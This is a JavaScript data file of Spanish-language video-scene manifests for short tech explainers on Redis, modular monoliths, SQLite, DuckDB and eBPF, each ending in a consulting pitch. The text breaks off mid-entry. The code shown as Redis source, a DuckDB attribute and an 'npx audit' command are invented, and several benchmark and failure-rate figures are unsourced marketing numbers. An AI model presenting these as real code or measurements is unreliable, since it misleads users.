window.__BIBLIOTECA_2026__ = [
  {
    "key": "demo_redis",
    "topicNum": "00",
    "group": "00. DEMO ORIGINAL",
    "label": "Por qué Redis procesa 100K peticiones por segundo",
    "variation": "Demo",
    "category": "SISTEMAS & RENDIMIENTO",
    "manifest": {
      "title": "Por qué Redis procesa 100K peticiones por segundo",
      "fps": 30,
      "output": "C:\\Users\\Edixon\\Desktop\\VIDEO_REDIS_60S_FINAL.mp4",
      "scenes": [
        {
          "id": "scene_01_hook",
          "type": "kinetic_hook",
          "duration": 4,
          "voiceover": "¿Por qué Redis vuela mientras tu base de datos colapsa? Cien mil peticiones por segundo.",
          "visual_cue": "Entra texto cinético en muelle y rayo dorado",
          "props": {
            "badge": "ANÁLISIS DE SISTEMAS",
            "icon": "lightning",
            "lines": [
              {
                "text": "¿POR QUÉ REDIS",
                "color": "#ffffff"
              },
              {
                "text": "VUELA?",
                "color": "#fbbf24"
              }
            ],
            "subtitle": "100.000 PETICIONES POR SEGUNDO"
          }
        },
        {
          "id": "scene_02_bottleneck",
          "type": "metrics_comparison",
          "duration": 5,
          "voiceover": "El cuello de botella siempre es el disco. Una llamada al sistema NVMe tarda cincuenta mil nanosegundos.",
          "visual_cue": "Barra roja de disco se dispara hasta 50.000 ns",
          "props": {
            "badge": "EL PROBLEMA DE FONDO",
            "title": "EL CUELLO DE BOTELLA DEL DISCO",
            "itemA": {
              "name": "LATENCIA DISCO NVMe",
              "value": 50000,
              "max": 50000,
              "color": "#ef4444",
              "subtext": "50.000 ns POR LLAMADA AL SISTEMA"
            },
            "itemB": {
              "name": "LATENCIA OBJETIVO",
              "value": 1000,
              "max": 50000,
              "color": "#71717a",
              "subtext": "MÁXIMO TOLERADO EN ALTA CONCURRENCIA"
            },
            "speedup": "EL DISCO ES 50X DEMASIADO LENTO"
          }
        },
        {
          "id": "scene_03_ram_intro",
          "type": "kinetic_hook",
          "duration": 5.5,
          "voiceover": "El primer secreto: Redis elimina el disco por completo y opera cien por ciento en memoria RAM.",
          "visual_cue": "Aparece icono de memoria y texto verde 100% RAM",
          "props": {
            "badge": "SECRETO #1",
            "icon": "memory",
            "lines": [
              {
                "text": "CERO DISCO.",
                "color": "#ffffff"
              },
              {
                "text": "100% MEMORIA RAM.",
                "color": "#10b981"
              }
            ],
            "subtitle": "TIEMPO DE ACCESO: 80 NANOSEGUNDOS"
          }
        },
        {
          "id": "scene_04_memory_hex",
          "type": "memory_layout",
          "duration": 7,
          "voiceover": "Aquí lo ves en memoria real: punteros directos sin serializar y acceso físico en solo ochenta nanosegundos.",
          "visual_cue": "Tabla hexadecimal se ilumina mostrando punteros a RAM",
          "props": {
            "badge": "DEBUGGER DE MEMORIA",
            "title": "ACCESO DIRECTO A BYTES EN RAM",
            "rows": [
              {
                "addr": "0x7FFE0010",
                "hex": [
                  "72",
                  "65",
                  "64",
                  "69",
                  "73",
                  "5F",
                  "6B",
                  "76"
                ],
                "label": "KEY: \"redis_kv\""
              },
              {
                "addr": "0x7FFE0018",
                "hex": [
                  "00",
                  "00",
                  "00",
                  "08",
                  "7F",
                  "FE",
                  "00",
                  "40"
                ],
                "label": "POINTER -> DICT"
              },
              {
                "addr": "0x7FFE0020",
                "hex": [
                  "FF",
                  "00",
                  "C0",
                  "A8",
                  "01",
                  "0A",
                  "1F",
                  "90"
                ],
                "label": "CLIENT TCP FD"
              },
              {
                "addr": "0x7FFE0028",
                "hex": [
                  "01",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00"
                ],
                "label": "EXPIRE AT (TTL)"
              }
            ]
          }
        },
        {
          "id": "scene_05_myth_buster",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Multi-threading con hilos concurrentes? Falso. Redis corre en un solo hilo sin un solo lock.",
          "visual_cue": "Titular de mito se quiebra y entra 'ES UN SOLO HILO'",
          "props": {
            "badge": "EL GRAN MITO",
            "icon": "lightning",
            "lines": [
              {
                "text": "¿MULTI-THREADING?",
                "color": "#ffffff"
              },
              {
                "text": "ES UN SOLO HILO.",
                "color": "#fbbf24"
              }
            ],
            "subtitle": "CERO LOCKS. CERO CONCURRENCIA BLOQUEANTE."
          }
        },
        {
          "id": "scene_06_arch_flow",
          "type": "architecture_flow",
          "duration": 7.5,
          "voiceover": "Usa multiplexación con epoll: diez mil clientes envían datos y el event loop atiende los eventos listos sin frenar jamás.",
          "visual_cue": "Diagrama de flujo activo: paquetes viajan por carriles a la cola",
          "props": {
            "header": "MULTIPLEXACIÓN I/O CON EPOLL",
            "nodes": [
              {
                "id": "clients",
                "label": "CLIENT CONCURRENT CONNS",
                "sublabel": "10.000 CONEXIONES ABIERTAS",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "eventloop",
                "label": "SINGLE-THREADED EVENT LOOP",
                "sublabel": "I/O MULTIPLEXING (ae_epoll.c)",
                "color": "#fbbf24",
                "y": 520
              },
              {
                "id": "storage",
                "label": "IN-MEMORY HASH TABLE",
                "sublabel": "O(1) AVERAGE LOOKUP TIME",
                "color": "#10b981",
                "y": 880
              }
            ],
            "queueSlots": 6
          }
        },
        {
          "id": "scene_07_code_c",
          "type": "code_terminal",
          "duration": 7,
          "voiceover": "En su código en C, epoll_wait captura los eventos y processCommand ejecuta la consulta en memoria al instante.",
          "visual_cue": "Editor de código resalta la línea processCommand en amarillo",
          "props": {
            "badge": "CÓDIGO FUENTE DE REDIS",
            "filename": "ae_epoll.c",
            "lang": "C",
            "codeLines": [
              {
                "text": "int numevents = epoll_wait(state->epfd, state->events, ...);",
                "highlight": false
              },
              {
                "text": "for (int j = 0; j < numevents; j++) {",
                "highlight": false
              },
              {
                "text": "    // Procesa eventos de sockets sin locks ni threads",
                "highlight": false
              },
              {
                "text": "    processCommand(c); // Ejecución inmediata en memoria",
                "highlight": true
              },
              {
                "text": "}",
                "highlight": false
              }
            ],
            "terminal": {
              "command": "gcc -O3 -c ae_epoll.c",
              "output": "ae_epoll.o generated (zero overhead kernel bindings)"
            }
          }
        },
        {
          "id": "scene_08_benchmark",
          "type": "code_terminal",
          "duration": 7,
          "voiceover": "El benchmark oficial lo demuestra: ciento dieciocho mil operaciones por segundo con latencia sub-milisegundo.",
          "visual_cue": "Terminal ejecuta redis-benchmark con salida de rendimiento en vivo",
          "props": {
            "badge": "BENCHMARK EN VIVO",
            "filename": "benchmark.sh",
            "lang": "BASH",
            "codeLines": [
              {
                "text": "redis-server --port 6379 --daemonize yes",
                "highlight": false
              },
              {
                "text": "redis-benchmark -q -n 100000 -c 50 -P 16",
                "highlight": true
              },
              {
                "text": "echo \"BENCHMARK DE ALTA CONCURRENCIA FINALIZADO\"",
                "highlight": false
              }
            ],
            "terminal": {
              "command": "redis-benchmark -q -n 100000 -c 50 -P 16",
              "output": "SET: 118,483 req/sec (avg latency: 0.12ms)\nGET: 121,951 req/sec (avg latency: 0.09ms)\n100.00% <= 1 ms latency"
            }
          }
        },
        {
          "id": "scene_09_versus",
          "type": "metrics_comparison",
          "duration": 7.5,
          "voiceover": "Frente a los cuatro mil registros de una base SQL en disco, Redis rinde casi veinticinco veces más rápido.",
          "visual_cue": "Comparativa de barras en verde y bloque '24.6x MÁS RÁPIDO'",
          "props": {
            "badge": "COMPARATIVA FINAL",
            "title": "THROUGHPUT REAL MEDIDO",
            "itemA": {
              "name": "BASE DE DATOS SQL (DISCO)",
              "value": 4800,
              "max": 120000,
              "color": "#71717a",
              "subtext": "I/O SYSTEM CALL BOUND"
            },
            "itemB": {
              "name": "REDIS (RAM DIRECTA)",
              "value": 118500,
              "max": 120000,
              "color": "#10b981",
              "subtext": "IN-MEMORY ZERO-LOCK"
            },
            "speedup": "24.6x MÁS RÁPIDO"
          }
        },
        {
          "id": "scene_10_cierre",
          "type": "kinetic_hook",
          "duration": 5,
          "voiceover": "Lección de arquitectura: la RAM es el nuevo disco. Sígueme en SeDev para más ingeniería de sistemas.",
          "visual_cue": "Cierre con texto verde 'LA RAM ES EL NUEVO DISCO' y firma",
          "props": {
            "badge": "LECCIÓN DE INGENIERÍA",
            "icon": "speed",
            "lines": [
              {
                "text": "LA RAM ES",
                "color": "#ffffff"
              },
              {
                "text": "EL NUEVO DISCO.",
                "color": "#10b981"
              }
            ],
            "subtitle": "SEDEV: ARQUITECTURA DE SOFTWARE"
          }
        }
      ]
    }
  },
  {
    "key": "01_A",
    "topicNum": "01",
    "group": "01. MONOLITO MODULAR",
    "label": "Var A (Técnico): Cómo estructurar un Monolito Modular sin código espagueti",
    "variation": "A (Técnico)",
    "category": "ARQUITECTURA DE SOFTWARE",
    "manifest": {
      "title": "[01] Cómo estructurar un Monolito Modular sin código espagueti (Var A)",
      "category": "ARQUITECTURA DE SOFTWARE",
      "slug": "01_monolito_modular",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Tu monolito se volvió un monstruo inmanejable? El error no fue el monolito: fue no definir límites de dominio.",
          "visual_cue": "Tipografía cinética de impacto sin iconos genéricos",
          "props": {
            "layout": "impact",
            "badge": "ARQUITECTURA MODERNA",
            "lines": [
              {
                "text": "EL GRAN REGRESO DEL",
                "color": "#ffffff"
              },
              {
                "text": "MONOLITO MODULAR",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "Límites de dominio en un solo binario"
          }
        },
        {
          "id": "problem",
          "type": "tradeoff_matrix",
          "duration": 5.5,
          "voiceover": "Partir tu app en veinte microservicios solo multiplicó la latencia de red y los fallos distribuidos.",
          "visual_cue": "Tabla comparativa mostrando la sobrecarga de microservicios vs monolito modular",
          "props": {
            "header": "DIAGNÓSTICO ARQUITECTÓNICO",
            "title": "EL COSTE OCULTO DE DISTRIBUIR",
            "subtitle": "LATENCIA DE RED VS LLAMADAS EN RAM",
            "colA": "MONOLITO MODULAR",
            "colB": "MICROSERVICIOS",
            "rows": [
              {
                "dim": "Llamadas internas",
                "a": "< 0.01ms (RAM)",
                "b": "15-40ms (HTTP)",
                "aGood": true
              },
              {
                "dim": "Transacciones",
                "a": "ACID Nativas",
                "b": "Saga Pattern (Frágil)",
                "aGood": true
              },
              {
                "dim": "Despliegues",
                "a": "1 Pipeline simple",
                "b": "15 Pipelines K8s",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "modules_arch",
          "type": "architecture_flow",
          "duration": 6,
          "voiceover": "Un monolito modular vive en un solo binario, pero sus módulos están aislados como si fueran cajas negras.",
          "visual_cue": "Diagrama de flujo mostrando módulos aislados: Auth, Billing y Inventory comunicándose por interfaces",
          "props": {
            "header": "ESTRUCTURA DE DOMINIO",
            "title": "LÍMITES ESTRICTOS EN MEMORIA",
            "nodes": [
              {
                "id": "api",
                "label": "API GATEWAY INTERNO",
                "sublabel": "Fastify / Axum Router",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "modules",
                "label": "DOMINIOS AISLADOS (DDD)",
                "sublabel": "Orders · Billing · Users (Aislamiento de imports)",
                "color": "#10b981",
                "y": 520
              },
              {
                "id": "storage",
                "label": "POSTGRES TRANSACCIONAL",
                "sublabel": "Esquemas lógicos separados en una sola DB",
                "color": "#fbbf24",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "code_boundary",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "En código, prohibimos las importaciones directas entre módulos. Cada dominio expone una interfaz pública estricta.",
          "visual_cue": "Terminal mostrando TypeScript / Rust haciendo cumplir límites de módulos con ESLint / ArchUnit",
          "props": {
            "header": "REGLAS EN CI/CD",
            "title": "ENFORCEMENT DE IMPORTACIONES",
            "filename": "packages/orders/domain.ts",
            "codeLines": [
              "# Importación profunda bloqueada por el linter:",
              "import { PaymentModel } from \"@app/billing/internal\"; // ERROR",
              "",
              "# Comunicación correcta por contrato público:",
              "import { BillingFacade } from \"@app/billing\";",
              "const invoice = await BillingFacade.charge(order.id);"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "acid_power",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Lo mejor: conservas transacciones ACID completas. Si el pago falla, la orden se cancela sin dramas distribuidos.",
          "visual_cue": "Métricas de fiabilidad de transacciones: 100% consistencia vs eventual consistency",
          "props": {
            "header": "INTEGRIDAD DE DATOS",
            "metricA": {
              "label": "MICROSERVICIOS (SAGA)",
              "value": "84.2%",
              "sub": "Fallos de consistencia eventual",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "MONOLITO MODULAR",
              "value": "100%",
              "sub": "Garantía ACID en una sola base",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta",
          "type": "tradeoff_matrix",
          "duration": 4.5,
          "voiceover": "Si tu equipo está atrapado en un laberinto de microservicios y quieres migrar a un monolito modular limpio, link en mi bio para auditar tu arquitectura.",
          "visual_cue": "Cierre con tarjeta de contacto y consultoría de arquitectura",
          "props": {
            "header": "CONSULTORÍA DE ARQUITECTURA",
            "title": "SIMPLIFICA TU CODEBASE",
            "subtitle": "REDUCE COSTES · MULTIPLICA VELOCIDAD",
            "cta": {
              "badge": "AUDITORÍA DE ARQUITECTURA (Link en bio)",
              "text": "¿Dudas con tu arquitectura? Enlace en mi perfil para agendar una sesión técnica."
            }
          }
        }
      ]
    }
  },
  {
    "key": "01_B",
    "topicNum": "01",
    "group": "01. MONOLITO MODULAR",
    "label": "Var B (Polémico): Por qué tu startup NO necesita microservicios",
    "variation": "B (Polémico)",
    "category": "ARQUITECTURA DE SOFTWARE",
    "manifest": {
      "title": "[01] Por qué tu startup NO necesita microservicios (Var B)",
      "category": "ARQUITECTURA DE SOFTWARE",
      "slug": "01_monolito_modular",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "direct_terminal_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Tu startup tiene tres desarrolladores y diez microservicios. Están quemando la mitad de su tiempo y presupuesto manteniendo Kubernetes.",
          "visual_cue": "Apertura directa con terminal comparando factura mensual y tiempo de despliegue",
          "props": {
            "header": "EL COSTE DE LA MODA",
            "title": "KUBERNETES VS UN SOLO SERVIDOR",
            "subtitle": "COMPARATIVA DE COSTES REALES EN PRODUCCIÓN",
            "termA": {
              "title": "STACK CON MICROSERVICIOS",
              "color": "#ef4444",
              "cmd": "kubectl get pods --all-namespaces",
              "status": "24 pods en ejecución · 8 clusters",
              "time": "$3,800/mes",
              "lines": [
                "Factura AWS EKS + NAT Gateways: $3,800",
                "Tiempo medio de debugging: 4 horas",
                "Tracing distribuido obligatorio con Jaeger"
              ]
            },
            "termB": {
              "title": "MONOLITO MODULAR CON KAMAL",
              "color": "#10b981",
              "cmd": "kamal deploy",
              "status": "1 solo binario en VPS dedicado",
              "time": "$120/mes",
              "lines": [
                "Factura servidor Hetzner: $120/mes",
                "Tiempo medio de deploy: 18 segundos",
                "Logs centralizados en stdout directos"
              ]
            }
          }
        },
        {
          "id": "verdict_b",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Los microservicios resuelven problemas de organización cuando tienes mil ingenieros, no de rendimiento técnico.",
          "visual_cue": "Matriz de tradeoffs demoledora",
          "props": {
            "header": "PRAGMATISMO TÉCNICO",
            "title": "¿CUÁNDO USAR CADA UNO?",
            "colA": "STARTUPS Y PYMES",
            "colB": "BIG TECH (+500 DEVS)",
            "rows": [
              {
                "dim": "Arquitectura recomendada",
                "a": "Monolito Modular",
                "b": "Microservicios",
                "aGood": true
              },
              {
                "dim": "Tiempo a producción",
                "a": "1 semana",
                "b": "3 meses",
                "aGood": true
              },
              {
                "dim": "Mantenimiento DevOps",
                "a": "0 personas dedicadas",
                "b": "Equipo entero",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_b",
          "type": "code_terminal",
          "duration": 5,
          "voiceover": "Si tu equipo pasa más tiempo arreglando pipelines que creando producto, audito tu arquitectura para volver a la simplicidad. Agenda en mi perfil.",
          "visual_cue": "Terminal de contacto con auditoría técnica",
          "props": {
            "header": "AUDITORÍA DE ARQUITECTURA",
            "title": "DESMANTELA LA COMPLEJIDAD",
            "filename": "audit/contact.sh",
            "codeLines": [
              "# Diagnóstico de cuellos de botella y costes cloud",
              "npx audit --target=microservices --strategy=consolidation",
              "Resultado estimado: -75% costes y 5x velocidad de entrega",
              "Agenda tu sesión técnica en el link de la bio."
            ],
            "cursorLine": 3
          }
        }
      ]
    }
  },
  {
    "key": "02_A",
    "topicNum": "02",
    "group": "02. SQLITE PRODUCCION",
    "label": "Var A (Técnico): 0ms de latencia: Arquitectura de SQLite embebido con Litestream",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & RENDIMIENTO",
    "manifest": {
      "title": "[02] 0ms de latencia: Arquitectura de SQLite embebido con Litestream (Var A)",
      "category": "BASES DE DATOS & RENDIMIENTO",
      "slug": "02_sqlite_produccion",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "latency_hook",
          "type": "latency_scale",
          "duration": 6.5,
          "voiceover": "Cada vez que tu backend consulta PostgreSQL en AWS RDS, pierdes quince milisegundos en el cable de red. SQLite vive en el mismo proceso.",
          "visual_cue": "Apertura directa con escala logarítmica de hardware mostrando el abismo de red",
          "props": {
            "header": "LATENCIA FÍSICA DE HARDWARE",
            "title": "EL ABISMO DE SALIR DEL PROCESO",
            "subtitle": "COMPARATIVA REAL DE TIEMPOS DE RESPUESTA",
            "tiers": [
              {
                "name": "RAM (DDR5 BUS)",
                "latency": "100 ns",
                "ratio": 0.1,
                "color": "#10b981",
                "human": "Instante"
              },
              {
                "name": "NVMe SSD LOCAL (SQLITE)",
                "latency": "0.1 ms",
                "ratio": 0.35,
                "color": "#38bdf8",
                "human": "0.1 milisegundos"
              },
              {
                "name": "AWS RDS NETWORK ROUND-TRIP",
                "latency": "18 ms",
                "ratio": 1,
                "color": "#ef4444",
                "human": "180x más lento"
              }
            ],
            "conclusion": "SQLite local responde antes de que el paquete TCP de Postgres salga del switch.",
            "conclusionSub": "Eliminas completamente la latencia de serialización y sockets de red."
          }
        },
        {
          "id": "litestream_stream",
          "type": "network_pipeline",
          "duration": 6,
          "voiceover": "¿Y los backups? Litestream replica cada transacción del WAL en milisegundos hacia un bucket S3 de forma transparente.",
          "visual_cue": "Diagrama de pipeline de datos: WAL local escribiendo a NVMe y streameando a S3",
          "props": {
            "header": "STREAMING REPLICATION",
            "title": "CERO PÉRDIDA DE DATOS CON LITESTREAM",
            "subtitle": "REPLICACIÓN CONTINUA DEL WRITE-AHEAD LOG",
            "stages": [
              {
                "id": "app",
                "label": "BACKEND APP (SQLITE WAL)",
                "sub": "Escrituras locales a 100K ops/s",
                "y": 220,
                "color": "#38bdf8",
                "metric": "0.05ms"
              },
              {
                "id": "litestream",
                "label": "LITESTREAM REPLICATOR",
                "sub": "Lee frames de WAL en background",
                "y": 520,
                "color": "#fbbf24",
                "metric": "10ms lag"
              },
              {
                "id": "s3",
                "label": "AMAZON S3 / CLOUDFLARE R2",
                "sub": "Respaldo inmutable geodistribuido",
                "y": 820,
                "color": "#10b981",
                "metric": "$0.50/mes"
              }
            ]
          }
        },
        {
          "id": "cta_sqlite",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu base de datos colapsa en picos de tráfico o estás saturando conexiones, realizo auditorías de latencia y arquitectura de datos. Enlace en mi bio.",
          "visual_cue": "Tarjeta final con oferta de auditoría de rendimiento en base de datos",
          "props": {
            "header": "AUDITORÍA DE DATOS Y LATENCIA",
            "title": "OPTIMIZA TU CAPA DE DATOS",
            "subtitle": "ELIMINA CUELLOS DE BOTELLA",
            "cta": {
              "badge": "AUDITORÍA DE BASES DE DATOS (Link en bio)",
              "text": "¿Latencia alta o saturación en tu DB? Link en mi perfil para auditar tus queries y pools."
            }
          }
        }
      ]
    }
  },
  {
    "key": "02_B",
    "topicNum": "02",
    "group": "02. SQLITE PRODUCCION",
    "label": "Var B (Polémico): ¿SQLite aguanta 50K req/s? Desmitificando la concurrencia",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & RENDIMIENTO",
    "manifest": {
      "title": "[02] ¿SQLite aguanta 50K req/s? Desmitificando la concurrencia (Var B)",
      "category": "BASES DE DATOS & RENDIMIENTO",
      "slug": "02_sqlite_produccion",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "benchmark_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Te dijeron que SQLite es solo un juguete. Aquí tienes cincuenta mil peticiones por segundo en un VPS de diez dólares con modo WAL.",
          "visual_cue": "Apertura directa con benchmark en vivo comparando RPS y consumo de memoria",
          "props": {
            "header": "BENCHMARK DE CONCURRENCIA",
            "title": "WRK BENCHMARK · 10,000 CLIENTES CONCURRENTES",
            "termA": {
              "title": "POSTGRESQL EN CLOUD RDS",
              "color": "#ef4444",
              "cmd": "wrk -t8 -c200 -d10s http://api/pg",
              "status": "Saturando pool de conexiones",
              "time": "4,200 req/s",
              "lines": [
                "Latencia p99: 42.1ms (Network queue)",
                "CPU al 85% en RDS micro",
                "Coste mensual estimado: $180"
              ]
            },
            "termB": {
              "title": "SQLITE EMBEDDED CON WAL",
              "color": "#10b981",
              "cmd": "wrk -t8 -c200 -d10s http://api/sqlite",
              "status": "Lectura directa de NVMe con page cache",
              "time": "52,400 req/s",
              "lines": [
                "Latencia p99: 0.8ms (Sub-milisegundo)",
                "CPU al 22% en VPS de $10",
                "Coste mensual: $10 (Hetzner VPS)"
              ]
            }
          }
        },
        {
          "id": "wal_mode",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Con el modo WAL activado, los lectores nunca bloquean a los escritores y las lecturas son concurrentes y paralelas.",
          "visual_cue": "Terminal configurando PRAGMA journal_mode=WAL y synchronous=NORMAL",
          "props": {
            "header": "CONFIGURACIÓN DE PRODUCCIÓN",
            "title": "MODO WAL Y CONCURRENCIA",
            "filename": "db/setup.sql",
            "codeLines": [
              "-- Activa escritura paralela sin bloqueo de lectores",
              "PRAGMA journal_mode = WAL;",
              "PRAGMA synchronous = NORMAL;",
              "PRAGMA busy_timeout = 5000;",
              "PRAGMA cache_size = -64000; -- 64MB RAM Cache",
              "-- 50.000 lecturas/s por núcleo de CPU"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "cta_sqlite_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu factura de base de datos se salió de control y quieres optimizar tu arquitectura, reviso tu stack técnico. Link en mi biografía.",
          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
          "props": {
            "header": "AUDITORÍA TÉCNICA DE BASES DE DATOS",
            "title": "REDUCE COSTES · ELEVA CONCURRENCIA",
            "cta": {
              "badge": "AUDITORÍA DE DATOS (Link en perfil)",
              "text": "¿Tu base de datos está lenta o cara? Agenda una auditoría técnica en el enlace del perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "03_A",
    "topicNum": "03",
    "group": "03. DUCKDB ANALYTICS",
    "label": "Var A (Técnico): Procesamiento Columnar Vectorizado: 10M filas en milisegundos",
    "variation": "A (Técnico)",
    "category": "DATA ENGINEERING & ANALYTICS",
    "manifest": {
      "title": "[03] Procesamiento Columnar Vectorizado: 10M filas en milisegundos (Var A)",
      "category": "DATA ENGINEERING & ANALYTICS",
      "slug": "03_duckdb_analytics",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "stat_hook",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Diez millones de filas analizadas en medio segundo dentro de tu laptop? Así funciona el procesamiento columnar de DuckDB.",
          "visual_cue": "Gancho cinético con número cuantitativo gigante",
          "props": {
            "layout": "stat",
            "badge": "ANALÍTICA DE DATOS",
            "stat": "10.000.000",
            "statLabel": "Filas procesadas en 420ms",
            "subtitle": "Procesamiento columnar vectorizado"
          }
        },
        {
          "id": "row_vs_col",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "Las bases transaccionales leen filas enteras, desperdiciando caché de CPU. DuckDB lee solo las columnas que necesitas en vectores contiguos.",
          "visual_cue": "Comparación visual de layout de memoria: Row-oriented vs Columnar Vectorized",
          "props": {
            "header": "MEMORIA Y HARDWARE",
            "title": "ROW-STORE VS COLUMN-STORE",
            "items": [
              {
                "name": "POSTGRES (ROW-STORE)",
                "addr": "Heap Tuple: Lee todos los campos de disco",
                "value": "Desperdicio de CPU L3 Cache",
                "color": "#ef4444"
              },
              {
                "name": "DUCKDB (VECTORIZED)",
                "addr": "Vector Chunk: 2048 enteros contiguos",
                "value": "Aceleración SIMD directa en CPU",
                "color": "#10b981"
              }
            ]
          }
        },
        {
          "id": "parquet_query",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Puedes consultar archivos Parquet directamente en Amazon S3 sin importar los datos. Solo descargas los bytes exactos que pide tu consulta.",
          "visual_cue": "Terminal ejecutando query SQL directa sobre s3://bucket/data.parquet",
          "props": {
            "header": "CONSULTA DIRECTA SOBRE PARQUET",
            "title": "ZERO-ETL ANALYTICS",
            "filename": "analytics/query.py",
            "codeLines": [
              "import duckdb",
              "# Lee 50GB en S3 descargando solo 40MB de metadata:",
              "res = duckdb.query(\"\"\"",
              "  SELECT user_country, SUM(amount_usd) ",
              "  FROM read_parquet(\"s3://logs-2026/*.parquet\")",
              "  GROUP BY 1 ORDER BY 2 DESC LIMIT 10;",
              "\"\"\").df()",
              "print(f\"Completado en {res.execution_time}ms\")"
            ],
            "cursorLine": 6
          }
        },
        {
          "id": "cta_duckdb",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu empresa gasta miles de dólares en Snowflake o BigQuery para consultas simples, audito tus costes de datos para migrar a motores in-process. Link en bio.",
          "visual_cue": "Cierre con llamado a auditoría de costes cloud de datos",
          "props": {
            "header": "AUDITORÍA DE COSTES CLOUD",
            "title": "REDUCE TU FACTURA DE ANALÍTICA",
            "cta": {
              "badge": "AUDITORÍA DE COSTES (Link en bio)",
              "text": "¿Gastas fortunas en Snowflake o Databricks? Link en mi perfil para auditar tus pipelines."
            }
          }
        }
      ]
    }
  },
  {
    "key": "03_B",
    "topicNum": "03",
    "group": "03. DUCKDB ANALYTICS",
    "label": "Var B (Polémico): Snowflake es un desperdicio: Analítica in-process con Parquet",
    "variation": "B (Polémico)",
    "category": "DATA ENGINEERING & ANALYTICS",
    "manifest": {
      "title": "[03] Snowflake es un desperdicio: Analítica in-process con Parquet (Var B)",
      "category": "DATA ENGINEERING & ANALYTICS",
      "slug": "03_duckdb_analytics",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "cost_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Las empresas queman cinco mil dólares al mes en Snowflake para correr reportes que una máquina de diez dólares procesa en segundos con DuckDB.",
          "visual_cue": "Apertura directa con comparativa de costes de Snowflake vs DuckDB",
          "props": {
            "header": "COMPARATIVA DE FACTURACIÓN",
            "title": "CLOUD DATA WAREHOUSE VS IN-PROCESS",
            "termA": {
              "title": "SNOWFLAKE / BIGQUERY CLUSTER",
              "color": "#ef4444",
              "cmd": "Warehouse XS Always-On + Storage fees",
              "status": "Créditos computacionales consumiéndose",
              "time": "$4,500/mes",
              "lines": [
                "Egress data transfer costs: $650",
                "Tiempo de arranque de warehouse: 8 segundos",
                "Lock-in de proveedor propietario"
              ]
            },
            "termB": {
              "title": "DUCKDB EMBEDDED + PARQUET EN S3",
              "color": "#10b981",
              "cmd": "duckdb server.duckdb --readonly",
              "status": "Motor C++ embebido en contenedor",
              "time": "$80/mes",
              "lines": [
                "Almacenamiento en S3 estándar: $45",
                "Instancia Hetzner 64GB RAM: $35",
                "Formato abierto Parquet y Apache Iceberg"
              ]
            }
          }
        },
        {
          "id": "cta_duckdb_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de datos de tu empresa para recortar sobrecostes de infraestructura. Escríbeme o agenda tu sesión en el link de mi perfil.",
          "visual_cue": "Cierre con auditoría de infraestructura de datos",
          "props": {
            "header": "AUDITORÍA DE INFRAESTRUCTURA",
            "title": "OPTIMIZACIÓN DE PIPELINES DE DATOS",
            "cta": {
              "badge": "AUDITORÍA DE COSTES (Link en perfil)",
              "text": "Recorta hasta un 80% en tu infraestructura de analítica. Enlace directo en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "04_A",
    "topicNum": "04",
    "group": "04. EBPF LINUX KERNEL",
    "label": "Var A (Técnico): eBPF: Cómo el Kernel de Linux intercepta tráfico a velocidad hardware",
    "variation": "A (Técnico)",
    "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
    "manifest": {
      "title": "[04] eBPF: Cómo el Kernel de Linux intercepta tráfico a velocidad hardware (Var A)",
      "category": "SISTEMAS OPERATIVOS & OBSERVABILIDAD",
      "slug": "04_ebpf_linux_kernel",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "pipe_hook",
          "type": "network_pipeline",
          "duration": 6.5,
          "voiceover": "¿Cómo monitorizar cada paquete de red a velocidad de silicio sin tocar una sola línea de código? Con eBPF en el Kernel de Linux.",
          "visual_cue": "Apertura directa con pipeline visual mostrando intercepción en el kernel",
          "props": {
            "header": "ARQUITECTURA DE RED EN KERNEL",
            "title": "INSPECCIÓN EN TIEMPO REAL SIN COPIAS",
            "subtitle": "BYTECODE VERIFICADO EN LINUX",
            "stages": [
              {
                "id": "nic",
                "label": "TARJETA DE RED (NIC)",
                "sub": "Llegada de paquetes Ethernet",
                "y": 220,
                "color": "#06b6d4",
                "metric": "40 Gbps"
              },
              {
                "id": "ebpf",
                "label": "EBPF PROGRAM (XDP)",
                "sub": "Intercepción en Ring Buffer del Kernel",
                "y": 520,
                "color": "#f59e0b",
                "metric": "0.005ms"
              },
              {
                "id": "app",
                "label": "USER SPACE RUNTIME",
